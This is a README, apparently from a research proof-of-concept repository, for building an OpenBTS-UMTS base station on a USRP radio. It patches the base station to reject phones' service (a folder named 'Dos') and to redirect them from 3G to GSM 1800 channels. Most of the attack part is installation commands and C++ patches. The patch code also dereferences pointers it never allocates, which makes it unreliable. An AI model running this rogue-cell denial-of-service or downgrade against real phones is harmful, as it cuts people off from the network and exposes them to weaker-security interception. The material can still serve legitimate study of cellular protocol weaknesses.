# umts_redirection
## ASN file
https://github.com/RangeNetworks/OpenBTS-UMTS/blob/master/ASN/rrc.asn1

## Installation :
* https://github.com/PentHertz/OpenBTS-UMTS/wiki
```
apt update
```
```
apt-get install git sqlite3*
```
Installing stable version of umts
```
git clone https://github.com/PentHertz/OpenBTS-UMTS.git
# Optionally use 1.1 branch for a stable version
```
```
cd  OpenBTS-UMTS
```
```
git checkout 1.1
```
```
git submodule init
```
```
git submodule update
```
```
./install_dependences.sh # install all dependencies without caring 
```
```
uhd_images_downloader
```
```
uhd_usrp_probe 
```
Result is as
```
[INFO] [UHD] linux; GNU C++ version 11.2.0; Boost_107400; UHD_4.1.0.5-3
[INFO] [B200] Loading firmware image: /usr/share/uhd/images/usrp_b200_fw.hex...
[INFO] [B200] Detected Device: B205mini
[INFO] [B200] Loading FPGA image: /usr/share/uhd/images/usrp_b205mini_fpga.bin...
[INFO] [B200] Operating over USB 3.
[INFO] [B200] Initialize CODEC control...
[INFO] [B200] Initialize Radio control...
[INFO] [B200] Performing register loopback test... 
[INFO] [B200] Register loopback test passed
[INFO] [B200] Setting master clock rate selection to 'automatic'.
[INFO] [B200] Asking for clock rate 16.000000 MHz... 
[INFO] [B200] Actually got clock rate 16.000000 MHz.
  _____________________________________________________
 /
|       Device: B-Series Device
|     _____________________________________________________
|    /
|   |       Mboard: B205mini
|   |   serial: 31BBF5F
|   |   name: B205i
|   |   product: 30522
|   |   revision: 3
|   |   FW Version: 8.0
|   |   FPGA Version: 7.0

```
```
./autogen.sh
```
```
./configure
```
```
make
```
```
sudo make install
```

Making log file 
```
sudo mkdir /var/log/OpenBTS-UMTS
```
Copying transceiver
```
cp TransceiverUHD/transceiver apps/ 
```
On the file OpenBTS-UMTS/apps
```
cd apps
```
```
mkdir /etc/OpenBTS-UMTS/
```
```
sudo sqlite3 /etc/OpenBTS-UMTS/OpenBTS-UMTS.db ".read OpenBTS-UMTS.example.sql"
```
You will need to setup forwarding in iptables to properly forward data between your devices, your host machine:
```
sudo iptables -t nat -A POSTROUTING -o <INTERNET INTERFACE> -j MASQUERADE
```
And also tell the kernel that IP forwarding is allowed:
```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward 1>/dev/null
```
```
cd ..
```
## (Optional) Using comp128
Checkout and install the libcoredumper library:
```
git clone https://github.com/PentHertz/libcoredumper
```
```
cd libcoredumper
```
```
./build.sh
```
```
cd coredumper-1.2.1
```
```
./configure
```
```
make && make install
```
```
cd ../..
```

Then install checkout subscriberRegistry module and make the project:
```
git clone https://github.com/PentHertz/subscriberRegistry
```
```
cd subscriberRegistry
```
```
git submodule init
```
```
git submodule update
```
```
./autogen.sh
```
```
./configure
```
```
make
```
```
sudo make install
```

Copy sipauthserve's comp128 to run-time directory of OpenBTS-UMTS
```
mkdir /OpenBTS-UMTS/
```
```
sudo cp apps/comp128 /OpenBTS-UMTS/
```
```
exit
```

## Running OpenBTS-UMTS
After successfully building and configuring, you are ready to launch OpenBTS-UMTS:
```
sudo su
```
Terminal 1
```
cd OpenBTS-UMTS/apps
```
```
./OpenBTS-UMTS
```
Tape ctrl+shift+T
Terminal 2
```
cd OpenBTS-UMTS/apps
```
```
sudo ./OpenBTS-UMTS
```

Several useful commands are available for debugging the packet-switched OpenBTS-UMTS application. Launch the OpenBTS-UMTS CLI to manipulate and configure your UMTS installation.

```
sudo /OpenBTS-UMTS/apps/OpenBTS-UMTSCLI
```

## Some configuration to be done : 
```
devconfig GSM.Timer.T3212 1
```
```
devconfig UMTS.Timer.T3212 1
```
```
devconfig UMTS.Radio.ARFCNs 1
```
```
devconfig UMTS.Radio.Band 900
```
```
devconfig UMTS.Radio.C0 3050
```
use 
```
devconfig UMTS.Radio.C0 3050
```
```
devconfig UMTS.RadioRxGain 25
```
Configure cellular network
CI is as BSIC
```
devconfig UMTS.Identity.CI 7708
```

```
devconfig UMTS.Identity.LAC 542
```
```
devconfig UMTS.Identity.MCC 001
```
```
devconfig UMTS.Identity.MNC 1
```
```
devconfig UMTS.Identity.URAI 279
```
## Routing area update reject at Sgsn.cpp
```
exit
```
```
sudo su
```
```
mkdir Dos
```
```
cd Dos
```
```
git clone https://github.com/PentHertz/OpenBTS-UMTS.git
```
```
cd OpenBTS-UMTS
```
```
git checkout 1.1
```
```
git submodule init
```
```
git submodule update
```
```
cd ..
```
```
cp -rf OpenBTS-UMTS OpenBTS-UMTS_Dos
```
```
cd OpenBTS-UMTS_Dos
```
```
gedit SGSNGGSN/Sgsn.cpp
```

* search :
```
handleRAUpdateRequest
```
And  uncomment all function call: 
```
sendRAUpdateReject;
```
like function  : 
```
sendRAUpdateReject(si,GmmCause::Location_Area_not_allowed);
```			
```
sendRAUpdateReject(si,GmmCause::Implicitly_detached);
```
```
sendRAUpdateReject(si,GmmCause::MS_identity_cannot_be_derived_by_the_network);
```
* The code of Location Update Reject (LUR) could be find at : </br>
https://github.com/PentHertz/OpenBTS-UMTS/blob/master/SGSNGGSN/Sgsn.cpp </br>
auxilliary at :  https://github.com/RangeNetworks/OpenBTS-UMTS/blob/master/apps/GetConfigurationKeys.cpp </br>

## service reject at Sgsn.cpp
```
gedit SGSNGGSN/Sgsn.cpp
```
* search :
```
handleServiceRequest
```
And  uncomment all function call: 
```
L3GmmMsgServiceReject
```
like function  : 
```
L3GmmMsgServiceReject sr(GmmCause::Implicitly_detached);
```
* The code of Location Update Reject (LUR) could be find at : 
https://github.com/PentHertz/OpenBTS-UMTS/blob/master/SGSNGGSN/Sgsn.cpp </br>
auxilliary at :  https://github.com/RangeNetworks/OpenBTS-UMTS/blob/master/apps/GetConfigurationKeys.cpp </br>
</br>
</br>
compiling openbts_umts_dos

```
./autogen.sh
```
```
./configure
```
```
make
```
```
sudo make install
```
```
exit
```


## REDIRECT V1 : For redirection for the first method rrcconnection_request (no code reject):  
* Could run with stable (1.1) or latest branch
```
exit
```
```
sudo su
```
```
mkdir redirect1
```
```
cd redirect1
```
```
git clone https://github.com/PentHertz/OpenBTS-UMTS.git
# Optionally use 1.1 branch for a stable version
```
```
git checkout 1.1
```
```
cd  OpenBTS-UMTS
```
```
git submodule init
```
```
git submodule update
```
```
./autogen.sh
```
```
./configure
```
* Open  URRCMessages.cpp
* Add description : descrRrcConnectionReject
```
const std::string descrRrcConnectionReject("RRC_Connection_Reject_Message");
```
* Search : void handleRrcConnectionRequest(ASN::RRCConnectionRequest_t *msg)  
And change :
```
sendRrcConnectionSetup(uep,&msg->initialUE_Identity);  
```
By
```
sendRrcConnectionReject(uep,&msg->initialUE_Identity);
```
* Search
```
static void sendRrcConnectionReleaseCcch(int32_t urnti)
```
And before this function function add this code :
```
// Add by Sitraka for reject : 
// Could be done with DL_CCCH but need to get *ueInitialId on *uep
void sendRrcConnectionReject(UEInfo *uep, ASN::InitialUE_Identity *ueInitialId){

	ASN::DL_CCCH_Message msg;
	memset(&msg,0,sizeof(msg));
	msg.message.present = ASN::DL_CCCH_MessageType_PR_rrcConnectionReject;
        ASN::RRCConnectionReject *reject = &msg.message.choice.rrcConnectionReject;

 	// Creating RRCConnectionReject now
	//msg.message.choice.rrcConnectionReject.present = ASN::RRCConnectionReject_PR_r3;
	reject->present = ASN::RRCConnectionReject_PR_r3;	
	ASN::RRCConnectionReject_r3_IEs_t *ies =
		&msg.message.choice.rrcConnectionReject.choice.r3.rrcConnectionReject_r3;
        
	// initial UE identity
	ies->initialUE_Identity =  *ueInitialId;	

	// transaction ID
	unsigned transactionId = uep->newTransactionId();
	ies->rrc_TransactionIdentifier = transactionId;
	
	// rejection cause : Congestion or Unspecified
	ies->rejectionCause = toAsnEnumerated(ASN::RejectionCause_congestion);
	
	//waitTime 0 until 16 sec
	ies->waitTime = 0;

    	// OPTIONNAL FOR REDIRECTION INFO PART ON Reject R3
	/*Specifying redirected channel*/	

	ASN::RRCConnectionReject_v690ext_IEs *v690 = &reject->choice.r3.laterNonCriticalExtensions->v690NonCriticalExtensions->rrcConnectionReject_v690ext;

	//In generated code C : struct GSM_TargetCellInfoList	*redirectionInfo_v690ext      
	//Just idea : v690->redirectionInfo_v690ext = (ASN::GSM_TargetCellInfoList*)calloc(1, sizeof(ASN::GSM_TargetCellInfoList));		
	ASN::GSM_TargetCellInfoList *gsmTargetList = v690->redirectionInfo_v690ext;
	// Set the number of GSM-TargetCellInfo instances
	gsmTargetList->list.count = 2;
	// Allocate memory for the GSM-TargetCellInfo instances
	gsmTargetList->list.array = (ASN::GSM_TargetCellInfo**)calloc(gsmTargetList->list.count, sizeof(ASN::GSM_TargetCellInfo *));
	// Set the fields of the first GSM-TargetCellInfo instance
	(gsmTargetList->list.array[0])->bcch_ARFCN = 512;
	// Frequency band : dcs1800BandUsed or 	pcs1900BandUsed
	(gsmTargetList->list.array[0])->frequency_band = toAsnEnumerated(ASN::Frequency_Band_dcs1800BandUsed);
	//(gsmTargetList->list.array[0])->bsic = 3; // BSIC IS NCC + BCC



	// Set the fields of the second GSM-TargetCellInfo instance
	(gsmTargetList->list.array[1])->bcch_ARFCN  = 514;
	//(gsmTargetList->list.array[1])->bsic = 5; // BSIC IS NCC + BCC
	(gsmTargetList->list.array[1])->frequency_band = toAsnEnumerated(ASN::Frequency_Band_dcs1800BandUsed);


	// FUTUR CASE : LATHER-THAN-R3	
        // WARNING: Now there are temporarily two pointers to the memory in UE_Identity.
	//reject->present = ASN::RRCConnectionReject_PR_later_than_r3;	// Guessing we can use any of the variants.
        //reject->choice.later_than_r3.initialUE_Identity =  *ueInitialId;
        //reject->choice.later_than_r3.rrc_TransactionIdentifier = transactionId;

	// FOR THE BYTE RESULT
	ByteVector result(1000);

	// WRITE THE ASN : choice 0 for urnti or may be uep->
	if (!encodeCcchMsg(&msg,result,descrRrcConnectionSetup,uep,0)) {return;}
	gMacSwitch.writeHighSideCcch(result,descrRrcConnectionReject);
}


// Add by Sitraka for reject2 : 
// Could be done with DL_DCCH but need to get *ueInitialId on *uep
void sendRrcConnectionReject(UEInfo *uep){

	ASN::DL_CCCH_Message msg;
	memset(&msg,0,sizeof(msg));
	msg.message.present = ASN::DL_CCCH_MessageType_PR_rrcConnectionReject;
        ASN::RRCConnectionReject *reject = &msg.message.choice.rrcConnectionReject;

 	// Creating RRCConnectionReject now
	//msg.message.choice.rrcConnectionReject.present = ASN::RRCConnectionReject_PR_r3;
	reject->present = ASN::RRCConnectionReject_PR_r3;	
	ASN::RRCConnectionReject_r3_IEs_t *ies =
		&msg.message.choice.rrcConnectionReject.choice.r3.rrcConnectionReject_r3;
        
	// initial UE identity 	AsnUeId mUid = uep->mUid;
        /*
	ASN::InitialUE_Identity_PR idType;
	public:
	ByteVector mImsi, mImei, mTmsiDS41;
	UInt32_z mMcc, mMnc;
	UInt32_z mTmsi, mPtmsi, mEsn;
	UInt16_z mLac;
	UInt8_z mRac;
	*/ 
	//ies->initialUE_Identity.present =  ASN::InitialUE_Identity_PR;
	ASN::InitialUE_Identity ueInitialId;	
	ueInitialId.present =  ASN::InitialUE_Identity_PR_NOTHING;
	uep->mUid.asnParse(ueInitialId);	

	ies->initialUE_Identity = ueInitialId;
	//ueInitialId.imsi = uep->mUid.mImsi;

	// transaction ID
	unsigned transactionId = uep->newTransactionId();
	ies->rrc_TransactionIdentifier = transactionId;
	
	// rejection cause : Congestion or Unspecified
	ies->rejectionCause = toAsnEnumerated(ASN::RejectionCause_congestion);
	
	//waitTime 0 until 16 sec
	ies->waitTime = 0;

    	// OPTIONNAL FOR REDIRECTION INFO PART ON Reject R3
	/*Specifying redirected channel*/	

	ASN::RRCConnectionReject_v690ext_IEs *v690 = &reject->choice.r3.laterNonCriticalExtensions->v690NonCriticalExtensions->rrcConnectionReject_v690ext;

	//In generated code C : struct GSM_TargetCellInfoList	*redirectionInfo_v690ext      
	//Just idea : v690->redirectionInfo_v690ext = (ASN::GSM_TargetCellInfoList*)calloc(1, sizeof(ASN::GSM_TargetCellInfoList));		
	ASN::GSM_TargetCellInfoList *gsmTargetList = v690->redirectionInfo_v690ext;
	// Set the number of GSM-TargetCellInfo instances
	gsmTargetList->list.count = 2;
	// Allocate memory for the GSM-TargetCellInfo instances
	gsmTargetList->list.array = (ASN::GSM_TargetCellInfo**)calloc(gsmTargetList->list.count, sizeof(ASN::GSM_TargetCellInfo *));
	// Set the fields of the first GSM-TargetCellInfo instance
	(gsmTargetList->list.array[0])->bcch_ARFCN = 512;
	// Frequency band : dcs1800BandUsed or 	pcs1900BandUsed
	(gsmTargetList->list.array[0])->frequency_band = toAsnEnumerated(ASN::Frequency_Band_dcs1800BandUsed);
	//(gsmTargetList->list.array[0])->bsic = 3; // BSIC IS NCC + BCC



	// Set the fields of the second GSM-TargetCellInfo instance
	(gsmTargetList->list.array[1])->bcch_ARFCN  = 514;
	//(gsmTargetList->list.array[1])->bsic = 5; // BSIC IS NCC + BCC
	(gsmTargetList->list.array[1])->frequency_band = toAsnEnumerated(ASN::Frequency_Band_dcs1800BandUsed);


	// FUTUR CASE : LATHER-THAN-R3	
        // WARNING: Now there are temporarily two pointers to the memory in UE_Identity.
	//reject->present = ASN::RRCConnectionReject_PR_later_than_r3;	// Guessing we can use any of the variants.
        //reject->choice.later_than_r3.initialUE_Identity =  *ueInitialId;
        //reject->choice.later_than_r3.rrc_TransactionIdentifier = transactionId;


	// FOR THE BYTE RESULT
	ByteVector result(1000);

	// WRITE THE ASN : choice 0 for urnti or may be uep->msGetHandle()
	if (!encodeCcchMsg(&msg,result,descrRrcConnectionSetup,uep,uep->msGetHandle())) {return;}
	gMacSwitch.writeHighSideCcch(result,descrRrcConnectionReject);
}
```
```
make
```
```
sudo make install
```

* diff file at : https://github.com/SitrakaResearchAndPOC/umts_redirection/blob/main/URRCMessages_diff0.txt
* cpp modified : https://github.com/SitrakaResearchAndPOC/umts_redirection/blob/main/URRCMessages.cpp_reject0

    
## REDIRECT V2 : For redirection on the second method rrcconnection_release (combined with attach reject with code reject) : 
* run only with the latest branch :
```
exit
```
```
sudo su
```
```
mkdir redirect2
```
```
cd redirect2
```
```
git clone https://github.com/PentHertz/OpenBTS-UMTS.git
# Optionally use latest branch
```
```
cd  OpenBTS-UMTS
```
```
git submodule init
```
```
git submodule update
```
```
./autogen.sh
```
```
./configure
```

* Add the description patch : 
```
const std::string descrRrcConnectionReleaseAsReject("RRC_Connection_Release_As_Reject_Message");
```
* Find and delete this function
```
void sendRrcConnectionRelease(UEInfo *uep)
```
And Replace by : 
```
// This puts the phone in idle mode.
void sendRrcConnectionRelease(UEInfo *uep) //, ASN::InitialUE_Identity *ueInitialId
{
	ASN::DL_CCCH_Message_t msg;
	memset(&msg,0,sizeof(msg));
	msg.message.present = ASN::DL_CCCH_MessageType_PR_rrcConnectionReject;
        ASN::RRCConnectionReject *reject = &msg.message.choice.rrcConnectionReject;

 	// Creating RRCConnectionReject now
	//msg.message.choice.rrcConnectionReject.present = ASN::RRCConnectionReject_PR_r3;
	reject->present = ASN::RRCConnectionReject_PR_r3;	
	ASN::RRCConnectionReject_r3_IEs_t *ies =
		&msg.message.choice.rrcConnectionReject.choice.r3.rrcConnectionReject_r3;


	//ies->initialUE_Identity.present =  ASN::InitialUE_Identity_PR;
	ASN::InitialUE_Identity ueInitialId;	
	ueInitialId.present =  ASN::InitialUE_Identity_PR_NOTHING;
	uep->mUid.asnParse(ueInitialId);	

	ies->initialUE_Identity = ueInitialId;

	// transaction ID
	unsigned transactionId = uep->newTransactionId();
	ies->rrc_TransactionIdentifier = transactionId;
	
	// rejection cause : Congestion or Unspecified
	ies->rejectionCause = toAsnEnumerated(ASN::RejectionCause_congestion);
	
	//waitTime 0 until 16 sec
	ies->waitTime = 0;

    	// OPTIONNAL FOR REDIRECTION INFO PART ON Reject R3
	/*Specifying redirected channel*/	

	ASN::RRCConnectionReject_v690ext_IEs *v690 = &reject->choice.r3.laterNonCriticalExtensions->v690NonCriticalExtensions->rrcConnectionReject_v690ext;

	//In generated code C : struct GSM_TargetCellInfoList	*redirectionInfo_v690ext      
	//Just idea : v690->redirectionInfo_v690ext = (ASN::GSM_TargetCellInfoList*)calloc(1, sizeof(ASN::GSM_TargetCellInfoList));		
	ASN::GSM_TargetCellInfoList *gsmTargetList = v690->redirectionInfo_v690ext;
	// Set the number of GSM-TargetCellInfo instances
	gsmTargetList->list.count = 2;
	// Allocate memory for the GSM-TargetCellInfo instances
	gsmTargetList->list.array = (ASN::GSM_TargetCellInfo**)calloc(gsmTargetList->list.count, sizeof(ASN::GSM_TargetCellInfo *));
	// Set the fields of the first GSM-TargetCellInfo instance
	(gsmTargetList->list.array[0])->bcch_ARFCN = 512;
	// Frequency band : dcs1800BandUsed or 	pcs1900BandUsed
	(gsmTargetList->list.array[0])->frequency_band = toAsnEnumerated(ASN::Frequency_Band_dcs1800BandUsed);
	//(gsmTargetList->list.array[0])->bsic = 3; // BSIC IS NCC + BCC



	// Set the fields of the second GSM-TargetCellInfo instance
	(gsmTargetList->list.array[1])->bcch_ARFCN  = 514;
	//(gsmTargetList->list.array[1])->bsic = 5; // BSIC IS NCC + BCC
	(gsmTargetList->list.array[1])->frequency_band = toAsnEnumerated(ASN::Frequency_Band_dcs1800BandUsed);


	ByteVector result(1000);
	if (!encodeCcchMsg(&msg,result,descrRrcConnectionRelease,uep,uep->msGetHandle())) {return;}
	gMacSwitch.writeHighSideCcch(result,descrRrcConnectionRelease);

	// Prepare to receive the reply to this message:
	UeTransaction(uep,UeTransaction::ttRrcConnectionRelease,0,transactionId,stIdleMode);

	uep->ueWriteHighSide(SRB2, result, descrRrcConnectionReleaseAsReject);
}
```
* diff file at : https://github.com/SitrakaResearchAndPOC/umts_redirection/blob/main/URRCMessages_diff1.txt
* cpp modified : https://github.com/SitrakaResearchAndPOC/umts_redirection/blob/main/URRCMessages.cpp_reject1

```
make
```
```
sudo make install
```

## COMBINING REDIRECT V1 AND V2 : 
* https://github.com/SitrakaResearchAndPOC/umts_redirection/blob/main/URRCMessages.cpp_diff.txt
* cpp modified : https://github.com/SitrakaResearchAndPOC/umts_redirection/blob/main/URRCMessages.cpp_reject
    
    
## For doing reject search all words reject and uncomment the code  : 
* https://github.com/RangeNetworks/OpenBTS-UMTS/blob/master/SGSNGGSN/Sgsn.cpp  
* https://github.com/RangeNetworks/OpenBTS-UMTS/blob/master/SGSNGGSN/GPRSL3Messages.cpp  
* https://github.com/RangeNetworks/OpenBTS-UMTS/blob/master/SGSNGGSN/Ggsn.cpp  
  
  
  
## List of reject cause : 
* https://github.com/RangeNetworks/OpenBTS-UMTS/blob/master/apps/GetConfigurationKeys.cpp 

## Doing diff file 
* https://www.linuxtricks.fr/wiki/utiliser-diff-et-patch-sous-linux#:~:text=Introduction,les%20diff%C3%A9rences%20ligne%20par%20ligne.
